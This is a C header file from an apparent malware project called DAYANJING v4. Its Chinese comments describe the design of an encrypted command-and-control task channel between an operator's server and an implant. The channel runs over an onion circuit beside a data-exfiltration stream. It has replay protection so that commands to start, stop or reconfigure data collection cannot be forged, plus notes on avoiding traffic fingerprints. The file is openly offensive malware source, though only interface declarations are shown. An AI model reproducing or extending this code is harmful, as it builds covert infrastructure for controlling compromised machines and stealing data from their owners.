/*
 * DAYANJING v4 — exfil_task_link.h
 *
 * 任务通道与已建立电路的 IO 绑定：把命令写进 fd、把回执从 fd 读出。
 *
 * ====================================================================
 * 为什么单独一层（与 exfil_link 并列而非复用）
 * ====================================================================
 * exfil_link 绑定的是「记录 <-> 定长信元流」，它是单向的、成批的、
 * 且内建 FIN 语义——适合采集产物这种"只管往外倒"的流量。
 *
 * 任务通道是**请求/响应**：命令下行必须等回执上行，且两者走同一条
 * 已建立的电路（洋葱电路是全双工的，relay 双向转发）。把命令塞进
 * 信元流会引入两个问题：
 *
 *   1) 信元层的 counter 是**单向**的，命令/回执若复用同一 chan，
 *      IV 会与产物流串位。
 *   2) 产物流是连续的、任务流是稀疏的，共用一批会互相截断。
 *
 * 因此任务通道走**独立的长度前缀帧**，不进信元层。代价是命令报文在
 * 线上长度不恒定（可被识别为"非采集流量"），这属于已知取舍：命令
 * 频率极低，且内容已被 AEAD 保护。要消除该长度指纹，正确做法是给
 * 命令做定长填充——那是独立的 padding 策略，不靠复用信元层。
 *
 * ====================================================================
 * 为什么必须是有状态会话（本层最关键的一点）
 * ====================================================================
 * 02_c2 的 c2_frame 把 IV（含 counter）**放在线上传输**，open 端直接
 * 取用，不跟踪计数器。因此 c2_frame 本身**没有重放防护**：把一条录制
 * 下来的命令原样重发，验签照样通过。
 *
 * 对采集产物这无所谓（重放只是重复一份已见过的数据），但对命令通道
 * 是致命的：
 *   - 重放 START  => 强迫植入体在操作员叫停后重新开采（制造暴露）
 *   - 重放 STOP   => 让操作员在关键时刻"失明"
 *   - 重放 SET_CFG=> 把已调优的参数打回旧值
 *
 * 因此本层维护 last_seq，要求**严格递增**，回退或重复一律 REPLAY。
 * 这是命令通道相对于产物通道额外需要的一层，不能省。
 *
 * ====================================================================
 * 线上帧格式
 * ====================================================================
 *   u32  len        LE，后续 AEAD 报文字节数
 *   u8   wire[len]  02_c2 帧层报文（已 AEAD，IV 在内）
 *
 * 必须先读长度、再读主体：TCP 是字节流，一次 recv 不保证拿全，
 * 长度前缀自身也可能被拆包。
 *
 * ====================================================================
 * 三条硬规则
 * ====================================================================
 * 一、长度必须设上界。
 *     对端（或被劫持的中继）可声明 len = 0xFFFFFFFF，据此分配就是
 *     4 GiB 内存耗尽。EXF_TASK_LINK_MAX_WIRE 是硬上界，超限按 LEN
 *     拒绝，绝不按声明值分配。
 *
 * 二、两个方向的密钥与计数器各自独立。
 *     下行 KS、上行 KR；IV = pfx || counter，两端各自从 0 推进。
 *     GCM 下 IV 重用是可恢复明文异或关系的灾难，绝不能混用。
 *
 * 三、seq 严格递增。
 *     见上"为什么必须是有状态会话"。seq 由调用方传入（通常与 C2 的
 *     任务序号同源），本层只保证单调性，不保证连续性。
 */

#ifndef DAYANJING_EXFIL_TASK_LINK_H
#define DAYANJING_EXFIL_TASK_LINK_H

#include <stddef.h>
#include <stdint.h>

#include "exfil_task.h"

#ifdef __cplusplus
extern "C" {
#endif

/* 单条 AEAD 报文的硬上界（1 KiB，足够容纳当前帧层开销并留余量） */
#define EXF_TASK_LINK_MAX_WIRE  1024u

/* ---- 返回码（沿用 exfil_task 错误域，新增 IO / REPLAY）---- */
#define EXF_TASK_ERR_IO      -7   /* 读不全 / 写失败 */
#define EXF_TASK_ERR_CLOSED  -8   /* 读到 EOF（对端关闭）*/
#define EXF_TASK_ERR_REPLAY  -9   /* seq 未严格递增（重放或乱序）*/

/*
 * 任务通道会话状态。
 * ks/kr 各自 16 字节，pfx 8 字节；init 时拷贝进结构体，调用方可在
 * init 后立即擦除自己的副本。wipe 清零本结构。
 */
typedef struct {
    uint8_t  ks[16];          /* 下行方向密钥（服务端封 / 植入体解）*/
    uint8_t  kr[16];          /* 上行方向密钥（植入体封 / 服务端解）*/
    uint8_t  pfx[8];

    uint32_t ctr_down;        /* 下行 IV 计数，每封一条 +1 */
    uint32_t ctr_up;          /* 上行 IV 计数，每封一条 +1 */

    uint64_t last_seq_down;   /* 已接受的最大下行 seq */
    uint64_t last_seq_up;     /* 已接受的最大上行 seq */
    int      has_down;        /* 是否已收到过下行（首条不做下界比较）*/
    int      has_up;
} exfil_task_chan_t;

/* 初始化。ks 与 kr 必须不同（退化密钥会让方向分离失效）。 */
int exfil_task_chan_init(exfil_task_chan_t *ch,
                         const uint8_t ks[16], const uint8_t kr[16],
                         const uint8_t pfx[8]);

/* 清零会话状态（含密钥材料）*/
void exfil_task_chan_wipe(exfil_task_chan_t *ch);

/*
 * 底层：把一个已封好的 AEAD 报文写进 fd（带长度前缀，处理短写）。
 * 供需要自行封包的高级调用方使用；一般走下面的 *_cmd / *_ack。
 */
int exfil_task_link_send(int fd, const uint8_t *wire, size_t wire_len);

/*
 * 底层：从 fd 读出一条 AEAD 报文（不解密）。
 *   cap 必须 >= EXF_TASK_LINK_MAX_WIRE。
 */
int exfil_task_link_recv(int fd, uint8_t *buf, size_t cap, size_t *wire_len);

/* ---- 下行：服务端 -> 植入体 ---- */

/* 封命令并写入 fd。成功后 ctr_down 推进。 */
int exfil_task_chan_cmd(exfil_task_chan_t *ch, int fd, uint64_t seq,
                        const exfil_task_cmd_t *c);

/* 读出并解开命令；seq 未严格递增返回 EXF_TASK_ERR_REPLAY。 */
int exfil_task_chan_recv_cmd(exfil_task_chan_t *ch, int fd, uint64_t *seq,
                             exfil_task_cmd_t *c);

/* ---- 上行：植入体 -> 服务端 ---- */

/* 封回执并写入 fd。成功后 ctr_up 推进。 */
int exfil_task_chan_ack(exfil_task_chan_t *ch, int fd, uint64_t seq,
                        const exfil_task_ack_t *a);

/* 读出并解开回执；seq 未严格递增返回 EXF_TASK_ERR_REPLAY。 */
int exfil_task_chan_recv_ack(exfil_task_chan_t *ch, int fd, uint64_t *seq,
                             exfil_task_ack_t *a);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EXFIL_TASK_LINK_H */
